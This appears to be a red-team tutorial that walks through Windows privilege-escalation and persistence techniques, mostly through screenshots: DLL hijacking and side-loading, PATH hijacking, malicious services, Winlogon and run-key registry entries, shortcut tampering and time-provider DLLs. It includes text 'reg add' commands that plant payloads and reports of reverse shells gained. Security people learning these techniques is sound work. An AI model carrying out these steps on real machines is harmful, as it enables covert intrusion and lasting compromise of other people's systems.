![](https://gblobscdn.gitbook.com/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhPO65wV20KDiTlpyA%2F-MRhZ59KnQkuIE-qzfN5%2Fimage.png?alt=media&token=37bf07cb-9353-4635-bf4a-c4245d871290)

### path-interception-by-search-order-hijacking

Adversaries may execute their own malicious payloads by hijacking the search order used to load other programs. Because some programs do not call other programs using the full path, adversaries may place their own file in the directory where the calling program is located, causing the operating system to launch their malicious software at the request of the calling program.

Search order hijacking occurs when an adversary abuses the order in which Windows searches for programs that are not given a path. Unlike DLL Search Order hijacking, the search order differs depending on the method that is used to execute the program. However, it is common for Windows to search in the directory of the initiating program before searching through the Windows System directory. An adversary who finds a program vulnerable to search order hijacking(i.e., a program that does not specify the path to an executable) may take advantage of this vulnerability by creating a program named after the improperly specified program and placing it within the initiating program's directory.

For example, "example.exe" runs "cmd.exe" with the command-line argument net user. An adversary may place a program called "net.exe" within the same directory as example.exe, "net.exe" will be run instead of the Windows system utility net. In addition, if an adversary places a program called "net.com" in the same directory as "net.exe", then cmd.exe /C net users will execute "net.com" instead of "net.exe" due to the order of executable extensions defined under PATHEXT.

Search order hijacking is also common practice for hijacking DLL loads.

**Example:**

So in this example I created a simple C++ example.exe application which calls net.exe and uses the arguments 

**net users.**

This application is vulnerable to Search order Hijacking as since the program net.exe is not called with it's full path Windows is Searching for the program in its predetermined order that I have mentioned previously, take a look at the code:

![](https://gblobscdn.gitbook.com/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhPO65wV20KDiTlpyA%2F-MRhYpduR8Vr-oTgM8LO%2Fimage.png?alt=media&token=3f932934-ff0b-4ee5-9e66-634e5a224b7a)

I will execute example.exe in a regular directory where there is no malicious hijacking.

![](https://gblobscdn.gitbook.com/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhPO65wV20KDiTlpyA%2F-MRhYqSMqAVFXzccbJ_M%2Fimage.png?alt=media&token=7f3b4ec8-3763-41aa-ba84-1c06a041fd87)

As you can see above the child processes from Example it called net.exe and windows found it in the %SystemRoot% Path.

So what happens when the program is called in a directory where there is a similar program named net.exe but it is actually our malicious payload?.

![](https://gblobscdn.gitbook.com/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhPO65wV20KDiTlpyA%2F-MRhYrP9Wb8NoHkYlq3D%2Fimage.png?alt=media&token=ea553c4f-7bcf-4b97-a716-6e27b3ac09c3)

We can see it found our malicious payload that executes calc.exe and it runs that one instead, since one of the first paths it usually takes before finding it in C:\Windows\System32 is the current working directory.

![](https://gblobscdn.gitbook.com/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhPO65wV20KDiTlpyA%2F-MRhYuO0WNJWkdu214MC%2Fimage.png?alt=media&token=a025b915-1ca5-4445-9b38-f295943d83aa)

Calc.exe is executed instead.

### path-interception-by-path-environment-variable

Adversaries may execute their own malicious payloads by hijacking environment variables used to load libraries. Adversaries may place a program in an earlier entry in the list of directories stored in the PATH environment variable, which Windows will then execute when it searches sequentially through that PATH listing in search of the binary that was called form a script or the command line.

The PATH environment variable contains a list of directories. Certain methods of executing a program (namely using cmd.exe or the command-line) rely solely on the PATH environment variable to determine the locations that are searched for a program when the path for the program is not given. If any directories are listed in the PATH environment variable before the Windows directory %SystemRoot%\System32 (e.g.: C:\Windows\System32), a program may be placed in the preceding directory that is named the same as a Windows program (such as cmd, PowerShell, or python), which will be executed when that command is executed from a script or command-line.

For example, if C:\example Path precedes C:\Windows\System32 is in the PATH environment variable, a program that is named net.exe and placed in C:\example Path will be called instead of the Windows system "net" when "net" is executed from the command-line.

**Example:**

It's possible to abuse the %Path% variable environment variable to elevate privileges as long as the user has permissions to (W) Write and it comes 

**BEFORE**

 C:\Windows\System32.

By using the 

**set path=**

 we can set the path we have control of.

Let us check our PATH variable and see how it looks

![](https://gblobscdn.gitbook.com/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhPO65wV20KDiTlpyA%2F-MRhYf_6QCOz303gDYui%2Fimage.png?alt=media&token=f65a877d-f796-4c15-84fc-dd557276fac0)

Ok so now I will add our malicious payload which in this case it's calc.exe replacing net.exe.

![](https://gblobscdn.gitbook.com/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhPO65wV20KDiTlpyA%2F-MRhYgM6F9qjB4XMGX5z%2Fimage.png?alt=media&token=97ff9d5f-95c1-4d74-af90-a26dcf208de5)

We add our new path and make sure this is before C:\Windows\System32.

![](https://gblobscdn.gitbook.com/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhPO65wV20KDiTlpyA%2F-MRhYhF7UTBGrrbNkR5m%2Fimage.png?alt=media&token=282db0ed-c1f0-4c6a-a228-0e077c85458b)

Perfect, now I will run net.exe regularly and Calc should prompt instead.

### executable-installer-file-permissions-weakness

Adversaries may execute their own malicious payloads by hijacking the binaries used by an installer. These processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under higher-level permissions, which could include SYSTEM.

Another variation if this technique can be performed by takin advantage of a weakness that is common in executable, self-extracting installers. During the installation process, it is common for installers to use a subdirectory within the %TEMP% directory to unpack binaries such as DLLs, EXEs, or other payloads. When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process. This behavior is related to and may take advantage of DLL Search Order Hijacking.

Adversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code. This behavior is related to Bypass User Account Control. Several examples of this weakness in existing common installers have been reported to software vendors. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.

**Example**

In this example I will demonstrate a simple install 7z1512.exe I will run Procmon in this situation and see what is going on when my Installer is executed.

I noticed that 7z Installer is looking for a DLL named TextShaping.dll and it is looking for it in the current working directory.

![](https://gblobscdn.gitbook.com/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhPO65wV20KDiTlpyA%2F-MRhXtIXC130hr_C_TbA%2Fimage.png?alt=media&token=c608695a-d6e6-47d4-8b52-00f598187c56)

I will take the same approach as previous DLL examples and try to add this DLL with the proper architecture of the program which in this case is 32-bit

![](https://gblobscdn.gitbook.com/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhPO65wV20KDiTlpyA%2F-MRhXuLJSJjGHuAKS4QM%2Fimage.png?alt=media&token=b5344609-e9fa-47f1-a7e6-4feaa524e116)

We run the installer again but this time we are placing our payload named properly as the DLL that the installer is trying to load, in this case TextShaping

This time no more TextShaping location issues:

![](https://gblobscdn.gitbook.com/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhPO65wV20KDiTlpyA%2F-MRhXv1hEd4xC3Nl5wRr%2Fimage.png?alt=media&token=36b619ff-23f0-42d0-9b91-6c31a7fce911)

And we receive a shell on our attacking machine.

![](https://gblobscdn.gitbook.com/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhPO65wV20KDiTlpyA%2F-MRhXvkw4X-RRFeSoGXt%2Fimage.png?alt=media&token=73f9bfd8-8c12-418c-b639-da630f6190d1)

Here I received Administrator Privileges on the machine as only Admins can install new software but of course there are many scenarios where we can actually gain user permissions if the user has specific permissions to install now programs on that machine as well. Remember that proper execution of the installer is not functional anymore and will seem suspicious that we can't install a program. We can take an approach of a Proxy DLL but that is something for another time, I demonstrate that technique in DLL Side Loading

### dll-side-loading

Adversaries may execute their own malicious payloads by hijacking the library manifest used to load DLLs.

Adversaries may take advantage of vague references in the library manifest of a program by replacing a legitimate library with malicious one, causing the operating system to load their malicious library when it is called for by the victim program.

Program may specify DLLs that are loaded at runtime. Programs that improperly or vaguely specify a required DLL may be open to a vulnerability in which an unintended DLL is loaded. Side-loading vulnerabilities specifically occur when Windows Side-by-Side (WinSxS) manifests are not explicit enough about characteristics of the DLL to be loaded. Adversaries may take advantage of a legitimate program that is vulnerable by replacing the legitimate DLL with a malicious one.

Adversaries likely use this technique as a means of masking actions they perform under a legitimate, trusted system or software process.

Windows, like many operating systems, allows applications to load DLLs at runtime. Applications can specify the location of DLLs to load by specifying the location of DLLs to load by specifying a full path, using DLL redirection, or by using a manifest. If none of these methods are used, Windows attempts to locate the DLL by searching a predefined set of directories in a set of order.

Example:

I will work on the Winamp Program again, this time I won't be replacing any DLL files to load my payload but here I will be tricking the Program into load my DLL payload, usually to achieve this we would need a .manifest file to be modified and to point to our payload but here we will modify a legit DLL and add a "proxy DLL" to execute our payload and send the legitimate calls to the legit DLL as well. So here execution wouldn't even fail!

First we will search for a proper DLL, according to the hints the smaller the better. I will use Procmon again as well and search for a proper file that has a SUCCESS Result.

![](https://gblobscdn.gitbook.com/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhOHdRj4MUAcWObfTA%2F-MRhPCyZDqqN6DA2fjlF%2Fimage.png?alt=media&token=763d5683-eb28-4b6c-affc-fe09987ef66a)

My victim is the nsutil.dll, usually we want to target files that have user-land access but in these situations most likely you will encounter a situation where Administrator Privileges are required.

Will grab nsutil and place it on the same folder as our payload.dll file and have a work from this awesome tool DLLSideLoader.

![](https://gblobscdn.gitbook.com/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhOHdRj4MUAcWObfTA%2F-MRhPDm2BN3MdJZwW3fo%2Fimage.png?alt=media&token=6df11685-acca-4928-a4c7-0f2b47dedf42)

Will Import the PS1 Script onto our PowerShell Session and run the following syntax, if everything runs correctly you should see something like this:

![](https://gblobscdn.gitbook.com/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhOHdRj4MUAcWObfTA%2F-MRhPEoGFek8VXwys9Xy%2Fimage.png?alt=media&token=0a8afb1b-14d6-41e7-ad2f-b122570543dc)

Something I had troubles when using this method is I wasn't paying attention to the architecture of the software, I was mainly building my payload for a 64 Bit PC as this was my targeted machine, but in this situation we are targeting the program not the OS.

Will grab all of these files (payloadx86.dll, nsutil.dll and tmp2D86.dll and replace them where our legitimate program is located.

![](https://gblobscdn.gitbook.com/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhOHdRj4MUAcWObfTA%2F-MRhPFe3NeZXCvxqp7pB%2Fimage.png?alt=media&token=058f7b15-1674-43ce-895d-658c86452dc3)

Once winamp is executed the nsutil will call tmp and proxy the execution onto our payloadx86 and move back to the legitimate calls so our program won't crash but we will also receive our reverse shell. 

**(This is a Hit or Miss I managed to get it working sometimes and sometimes it wouldn't even open but will always receive a shell no matter the location of the binary as long as they were in the same location with the files)**

Or we can also execute without having all of this replaced they can run in the same folder as long as these files are all together (remember dll hijacking the order it follows)

![](https://gblobscdn.gitbook.com/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhOHdRj4MUAcWObfTA%2F-MRhPGVTR6b6XxSuVIED%2Fimage.png?alt=media&token=34d6444a-0ee4-42aa-aa5d-d9f98bc28ac7)

The same result for both situations.

![](https://gblobscdn.gitbook.com/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhOHdRj4MUAcWObfTA%2F-MRhPJxs6d61Hz4UcHGn%2Fimage.png?alt=media&token=b8027206-a7a7-4032-867d-4b314730e5ef)

##################################################################################################

![](https://gblobscdn.gitbook.com/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhOHdRj4MUAcWObfTA%2F-MRhPIgRNZCCMbu6diuB%2Fimage.png?alt=media&token=95ede75a-9be1-40c6-a46f-2fd2ffc35064)

References:

​

### dll-search-order-hijacking

Adversaries may execute their own malicious payloads by hijacking the search order used to load DLLs. Windows systems use a common method to look for required DLLs to load into a program, Hijacking DLL loads may be for the purpose of establishing persistence as well as elevating privileges and/or evading restrictions on file execution.

There are many ways an adversary can hijack DLL loads. Adversaries may plant trojan dynamic-link library files (DLLs) in a directory that will be searched before the location of a legitimate library that will be requested by a program, causing Windows to load their malicious library when it is called for by the victim program. Adversaries may also perform DLL preloading, also called binary planting attacks, by placing a malicious DLL with the same name as an ambiguously specified DLL in a location that Windows searches before the legitimate DLL. Often this location is the current working directory of the program. Remote DLL preloading attacks occur when a program sets its current directory to a remote location such as a Web share before loading a DLL.

Adversaries may also directly modify the way a program loads DLLs by replacing an existing DLL or modifying a .manifest or .local redirection file, directory, or junction to cause the program to load a different DLL.

If a search order-vulnerable program is configured to run at a higher privilege level, then the adversary-controlled DLL that is loaded will also be executed at the higher level. In this case, the technique could be used for privilege escalation from user to administrator or SYSTEM or from administrator to SYSTEM, depending on the program. Programs that fall victim to path hijacking may appear to behave normally because malicious DLLs may be configured to also load the legitimate DLLs they were meant to replace.

Let us see some examples:

In Windows Environments when an application or a service is starting it looks for a number of DLL's in order to function properly. If these DLL's doesn't exist or are implemented in an insecure way (DLL's are called without using a fully qualified path) then it is possible to escalate privileges by forcing the application to load and execute a malicious DLL File.

It should be noted that when an application needs to load a DLL it will go through the following order:

· The directory which the application is loaded.

· C:\Windows\System32

· C:\Windows\System

· C:\Windows

· The current working directory

· Directories in the system PATH environment variable

· Directories in the user PATH environment variable

A fast way to Hijack and Find any DLL Hijacking is using PowerSploits, Find-PathDLLHijack, Find-ProcessDLLHijack, Invoke-AllChecks. We can check that powersploit will tell us where the hijack is located and what command to use next to hijack the process immediately.

We will work with Administrator Privileges in this example, not completely necessary if you can find a user with misconfiguration permission where they are allowed to WRITE, crazy right!!?, who would do that!!?

**Procmon**

For this technique I will use Procmon, as this is a great toll to view what a program is loading at run time, there are also other great tools from PowerSploit that will verify this Vulnerability, other tools such as SharpUp from GhostPack it is a tool written in C#.

Our Process in this sample is Winamp.

Winamp is a media player for Microsoft Windows it was a very popular and widely used media player back in the early 2000's, in the version we are currently working on it contains a DLL Hijack vulnerability as it is trying to load many different DLL files inexistent in its current directory, we can verify this with Procmon.

![](https://gblobscdn.gitbook.com/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhOHdRj4MUAcWObfTA%2F-MRhOx_LcpwKDXFX9kij%2Fimage.png?alt=media&token=e03ccba8-2142-46e0-bedb-12f07bbb4138)

Wow, many potential hijacks, so our next step is to choose a DLL we wish to hijack, I will use the DLL . I will use a DLL this time to receive a reverse shell. My focus will be on vcruntime140d.dll

What happens when the program cannot find the DLL, it start following an order to locate the DLL

![](https://gblobscdn.gitbook.com/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhOHdRj4MUAcWObfTA%2F-MRhOyxBy-dbQi0p9O-0%2Fimage.png?alt=media&token=c506d436-f671-4f8f-93a3-c9996fb8f2e9)

Let us take a look and see what happens if I rename it, how will the order continue.

![](https://gblobscdn.gitbook.com/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhOHdRj4MUAcWObfTA%2F-MRhOzx0oN5aaCokeBAT%2Fimage.png?alt=media&token=a8e9a440-464b-4955-a0c8-2b6e3fde534f)

Now I will add this DLL to any of the other paths that are seen above see if it loads it and gives me a shell.

Once added:

![](https://gblobscdn.gitbook.com/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhOHdRj4MUAcWObfTA%2F-MRhP-wb38i6CkvFoAKx%2Fimage.png?alt=media&token=495e2e46-fff8-4832-9a1e-135d0a4fa8cd)

We can simply start the process and check the results

![](https://gblobscdn.gitbook.com/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhOHdRj4MUAcWObfTA%2F-MRhP1LQ1ocbxd9bW3pF%2Fimage.png?alt=media&token=718c142b-ab18-4818-ad58-b0f9f61ede90)

And this time it did find it.

![](https://gblobscdn.gitbook.com/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhOHdRj4MUAcWObfTA%2F-MRhP3HN1xpXhElGqYbl%2Fimage.png?alt=media&token=499d23bc-f79b-42db-85cd-4936ae059540)

References:

​

## untitled-1

Adversaries may create or modify system-level processes to repeatedly execute malicious payloads as part of persistence. When operating systems boot up, they can start processes that perform background system functions. On Windows and Linux, these system processes are referred to as services. On macOS, launchd processes known as Launch Daemon and Launch Agent are run to finish system initialization and load user specific parameters.

Adversaries may install new services, daemons, or agents that can be configured to execute at startup or a repeatable interval in order to establish persistence. Similarly, adversaries may modify existing services, daemons, or agents to achieve the same effect.

Services, daemons, or agents may be created with administrator privileges but executed under root/SYSTEM privileges. Adversaries may leverage this functionality to create or modify system processes in order to escalate privileges.

### windows-services

Adversaries may create or modify Windows services to repeatedly execute malicious payloads as part of persistence. When Windows boots up, it start programs or applications called services that perform background system functions. Windows service configuration information, including the file path to the service's executable or recovery programs/commands, is stored in Windows Registry. Service configurations can be modified using utilities such as sc.exe and Reg.

Adversaries may install a new service or modify an existing service by using system utilities to interact with services, by directly modifying the Registry, or by using custom tools to interact with the Windows API. Adversaries may configure services to execute at startup in order to persist on a system.

An adversary may also incorporate Masquerading by using a service name from a related operating system or benign software, or by modifying existing services to make detection analysis more challenging. Modifying existing services may interrupt their functionality or may enable services that are disabled or otherwise not commonly used.

Services may be created with administrator privileges but are executed under SYSTEM privileges, so an adversary may also use a service to escalate privileges from administrator to SYSTEM. Adversaries may also directly start services through Service Execution.

Example::

In this situation I will create a New Service to achieve persistence we can only continue here with Administrator Privileges as mentioned previously we will create a Service with Administrator but these services get executed as SYSTEM.

Here is a sample on what happens when working with user permissions:

![](https://gblobscdn.gitbook.com/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhJ5Q3mm3jD_Hm0yRL%2F-MRhKvsdq6ApZNUi9829%2Fimage.png?alt=media&token=d62e4483-77a4-47a1-9338-5b54e1e98363)

Now let's create it with Administrator Privileges the parameters are easy to follow:

![](https://gblobscdn.gitbook.com/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhJ5Q3mm3jD_Hm0yRL%2F-MRhKs3zMoY1kl1BKLgT%2Fimage.png?alt=media&token=4864ed1a-ae51-473f-9989-ff90b0b0234e)

Let us check our Service

![](https://gblobscdn.gitbook.com/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhJ5Q3mm3jD_Hm0yRL%2F-MRhKsoTOGlsAVXOKZna%2Fimage.png?alt=media&token=bd61f028-1a96-466e-8481-0563a2d76b74)

Currently stopped now we will start our service and check our shell back with SYSTEM privileges

![](https://gblobscdn.gitbook.com/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhJ5Q3mm3jD_Hm0yRL%2F-MRhKtRXJJs2Og96McIA%2Fimage.png?alt=media&token=9830ce26-82c6-44e1-965f-be7ed2c01322)

Shell:

![](https://gblobscdn.gitbook.com/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhJ5Q3mm3jD_Hm0yRL%2F-MRhKyGH2WeWXLJ-kGYl%2Fimage.png?alt=media&token=079bb77f-2900-4042-927b-edb65fd90813)

## untitled

Adversaries may configure system settings to automatically execute a program during system boot or logon to maintain persistence or gain a higher-level privileges on compromised systems. Operating systems may have a mechanism for automatically running a program on system boot or account logon. These mechanisms may include automatically executing programs that are place in specially designated directories or are referenced by repositories that store configuration information, such as the Windows Registry. And adversary may achieve the same goal by modifying or extending features of the kernel.

Since some boot or logon AutoStart programs run with higher privileges, an adversary may leverage these elevated privileges.

### winlogon-helper-dll

Adversaries may abuse features of Winlogon to execute DLLs and/or executables when a user logs in. Winlogon.exe is a Windows component responsible for actions at logon/logoff as well as the secure attention sequence (SAS) triggered by Ctrl-Alt-Delete. Registry entries in HKLM\Software{\Wow6432Node\}Microsoft\Windows NT\CurrentVersion\Winlogon and HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon are used to manage additional helper programs and functionalities that support Winlogon.

Malicious modifications to these Registry keys may cause Winlogon to load and execute malicious DLLs and/or executables. Specifically, the following subkeys have been known to be possibly vulnerable to abuse:

·         Winlogon\Notify - points to notification package DLLs that handle Winlogon events

·         Winlogon\Userinit - points to userinit.exe, the user initialization program executed when a user logs on

·         Winlogon\Shell - points to explorer.exe, the system shell executed when a user logs on

Adversaries may take advantage of these features to repeatedly execute malicious code and establish persistence.

Example:

As mentioned this component handles what is going on during logon and logoff times so this payload needs to be dropped onto the System23 folder, in this way we can load the legitimate binary and our payload and the same time.

The registry key that we will focus in this situation is the UserInit. We will need Administrator privileges for this technique to work properly.

Could not load image

Machine generated alternative text:
Administrator: Command Prompt 
Microsoft windows [Version 18.8.19842.638] 
(c) 2828 microsoft Corporation. All rights reserved . 
C: \Windows\system32>reg add NT\CurrentVersion\Win10gon" 'v Userinit 'd "Userinit .exe, payloadx64.exe" If 

We can also apply the same technique to the Shell Registry and we can also reach the same goal when a user logs in we will receive a shell.

From here we can simply lock the screen of the target workstation and wait for the user to log back onto the machine.

Logoff:

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhHFLvttKgY6bV3sia%2F-MRhIX9SpTgBCPzG58W7%2Fimage.png?alt=media&token=cd27f2cc-5a68-4479-9b59-f74d878d917b)

Sign-in:

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhHFLvttKgY6bV3sia%2F-MRhIXtD3yapNFH7GwJo%2Fimage.png?alt=media&token=f7c809e9-b9e1-40b2-9991-947d0af7999f)

Shel:

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhHFLvttKgY6bV3sia%2F-MRhIYu2DEBjEhnmWMdW%2Fimage.png?alt=media&token=e948e901-a47a-4fff-9c5e-4448d72b1297)

We have 2 registry keys that we can modify and reach our goal of persistence but we also have a 3rd one Notify Key:

The “

**Notify**

” registry key is typically found in older operating systems (prior to Windows 7) and it points to a notification package DLL file which handles Winlogon events. Replacing DLL entries under this registry key with an arbitrary DLL will cause Windows to execute it during logon.

As we can see both of our methods will work correctly and will execute on logon we just have to remember that these binary's need to be dropped on the System32 folder so that both the legitimate and the payload gets executed.

References:

​

[https://pentestlab.blog/2020/01/14/persistence-winlogon-helper-dll/](https://pentestlab.blog/2020/01/14/persistence-winlogon-helper-dll/)

### shortcut-modification

Adversaries may create or edit shortcuts to run a program during system boot or user login. Shortcuts or symbolic links are ways of referencing other files or programs that will be opened or executed when the shortcut is clicked or executed by a system startup process.

Adversaries could use shortcuts to execute their tools for persistence. They may create a new shortcut as a means of indirection that may use Masquerading to look like a legitimate program. Adversaries could also edit the target path or entirely replace an existing shortcut so their tools will be executed instead of the intended legitimate program.

**Example:**

LNK they are shortcut files that point to a binary or file which can be accessed directly without having to find the location of the file from various directories such as TXT Files.

It's very simple to create and have the shortcut point to our payload or command to execute.

Right Click

![](https://gblobscdn.gitbook.com/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhIbDAwNBAAWiFjGtQ%2F-MRhImc41dUGktjb9teY%2Fimage.png?alt=media&token=1d1f046d-0f0a-4f24-9b63-77a4fa569aec)

We fill in the command to get executed or we point it to our payload that we can use to establish persistence.

![](https://gblobscdn.gitbook.com/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhIbDAwNBAAWiFjGtQ%2F-MRhIlu5TUeWwWew4tmS%2Fimage.png?alt=media&token=a22b6a72-f7d5-48a2-ad08-9b6baf7e942d)

And save it

![](https://gblobscdn.gitbook.com/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhIbDAwNBAAWiFjGtQ%2F-MRhInNCfMx2w3NtTYBP%2Fimage.png?alt=media&token=3a834cf9-a64c-4e6b-a41c-62a06fb5e954)

We see that when double clicked it will spawn cmd but will open the calculator applications

![](https://gblobscdn.gitbook.com/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhIbDAwNBAAWiFjGtQ%2F-MRhIo2OFBkcONL7FJVU%2Fimage.png?alt=media&token=0c2fefe6-203d-4032-8003-7ef5a4a0b628)

We can also point to one of our payloads. And we can also change the icon so it doesn't look like your typical binary Icon being executed a little social engineering to trick our user.

![](https://gblobscdn.gitbook.com/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhIbDAwNBAAWiFjGtQ%2F-MRhIp1q4iEv1rD0NN7P%2Fimage.png?alt=media&token=5108298a-493b-4b2f-bbeb-70bf317dbdab)

Once double clicked we receive a shell

![](https://gblobscdn.gitbook.com/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhIbDAwNBAAWiFjGtQ%2F-MRhIpzN383hXa7vv87T%2Fimage.png?alt=media&token=6b484f48-3185-48cb-963f-3dc6dbdab277)

This technique will establish persistence at the current user level permissions running it.

![](https://gblobscdn.gitbook.com/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhIbDAwNBAAWiFjGtQ%2F-MRhIr-imfOooeBceCpA%2Fimage.png?alt=media&token=98a355a5-3e10-498c-af06-7616aaabf01a)

A great little trick but this will easily be found by our SOC. So just in handy to know that this is available.

Note LNK can also be created with PowerShell in case of no GUI available

![](https://gblobscdn.gitbook.com/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhIbDAwNBAAWiFjGtQ%2F-MRhIrn9InZ1wNQSrAUq%2Fimage.png?alt=media&token=a0360bdc-7f05-4e71-b37c-922dc1b2b6f5)

This technique can also be applied to already existing LNK files such as Google Chrome, Firefox, Edge, etc. As long as these are Shortcut links they can be easily modified as well to have them point to our payload.

**Unfortunately I am not aware on how to change the Icon from PS.**

### time-providers

Adversaries may abuse time providers to execute DLLs when the system boots. The Windows Time service (W32Time) enables time synchronization across and within domains. W32Time time provides are responsible for retrieving time stamps from hardware/network resources and outputting these values to other network clients.

Time providers are implemented as dynamic-link libraries (DLLs) that are registered in the subkeys of HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\W32Time\TimeProviders\. The time provider manager, directed by the service control manager, loads and starts time providers listed and enabled under this key at system startup and/or whenever parameters are changed.

The Windows Time Service (32Time) synchronizes the date and time for all computers running in Active Directory Domain Services (AD DS). Time synchronization is critical for the proper operation of many Windows services and line-of-business applications. The Windows Time service uses the Network Time Protocol (NTP) to synchronize computer clocks on the network. NTP ensures that an accurate clock value, or timestamp, can be assigned to network validation and resources access requests.

This approach requires Administrator Privileges as this resides in the System32 folder.

Will add a Registry Key that will call our malicious DLL File

Administrator Cmd:

![](https://gblobscdn.gitbook.com/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhHFLvttKgY6bV3sia%2F-MRhILv-8HSh4s5_gn14%2Fimage.png?alt=media&token=9d491b21-0d5c-425e-9ebd-d9e297109cef)

There is an already Registered Key so I will just accept to overwrite the DLLs values.

We can view the Service with the sc.exe command and query the properties.

![](https://gblobscdn.gitbook.com/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhHFLvttKgY6bV3sia%2F-MRhILAfemRqHWCjO0Ek%2Fimage.png?alt=media&token=2fdd9a4f-4737-486e-907c-eebfb69dfb77)

We see that it's currently running let us stop it and start the service back up again but this time we will be gaining a reverse shell from this technique.

Our Listener:

![](https://gblobscdn.gitbook.com/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhHFLvttKgY6bV3sia%2F-MRhIMuVRY5J2Un9hRyz%2Fimage.png?alt=media&token=76ee7b0c-22d2-455f-84ea-590b2b347f37)

Service stopped and started:

![](https://gblobscdn.gitbook.com/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhHFLvttKgY6bV3sia%2F-MRhINfa2LXvwLsIOP1b%2Fimage.png?alt=media&token=2d6915d2-8762-49ac-a13f-fbc65fe6b7a7)

Shell:

![](https://gblobscdn.gitbook.com/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhHFLvttKgY6bV3sia%2F-MRhIOURprXUYGtH84aq%2Fimage.png?alt=media&token=52d927b3-d5e1-4d9b-9f19-960a8fe61837)

References:

​

[https://pentestlab.blog/2019/10/22/persistence-time-providers/](https://pentestlab.blog/2019/10/22/persistence-time-providers/)

https://pentestlab.blog/2019/10/22/persistence-time-providers/

https://docs.microsoft.com/en-us/windows-server/networking/windows-time-service/windows-time-service-top

[https://docs.microsoft.com/en-us/windows-server/networking/windows-time-service/windows-time-service-top](https://pentestlab.blog/2019/10/22/persistence-time-providers/)

### registry-run-keys-startup-folder

Adversaries may achieve persistence by adding a program to a startup folder or referencing it with a Registry run key. Adding an entry to the "run keys" in the Registry or startup folder will cause the program referenced to be executed when a user logs in. These programs will be executed under the context of the user and will have the account's associated permissions level.

Placing a program within a startup folder will also cause the program to execute when a user logs in. There is a startup folder location for individual user accounts as well as a system-wide startup folder that will be checked regardless of which user account logs in. The startup folder path for the current user is: C:\Users[Username]\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup. The startup folder path for all users is: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp.

The following run keys are created by default on Windows systems:

· HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run

· HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce

· HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run

· HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce

Run keys may exist under multiple hives. The

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnceEx is also available but is not created by default on Windows Vista and newer. Registry run key entries can reference programs directly or list them as a dependency. For example, it is possible to load a DLL at logon using a "Depend" key with RunOnceEx: reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /d "C:\temp\evil[.]dll"

The following Registry keys can control automatic startup of services during boot:

· HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce

· HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce

